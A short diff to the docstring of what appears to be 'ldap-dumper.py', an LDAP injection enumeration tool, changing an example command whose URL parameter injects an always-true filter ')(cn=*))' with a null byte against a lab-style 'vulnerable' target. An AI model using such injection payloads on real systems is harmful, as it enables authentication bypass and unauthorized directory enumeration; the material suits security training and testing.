@@ -1,7 +1,7 @@
 """
 Example:
 
-python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED as'
+python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
 
 In this example, we inserted an expression into the param that will always
 return true if the parameter replaced by %s is true, in this case ennumerating
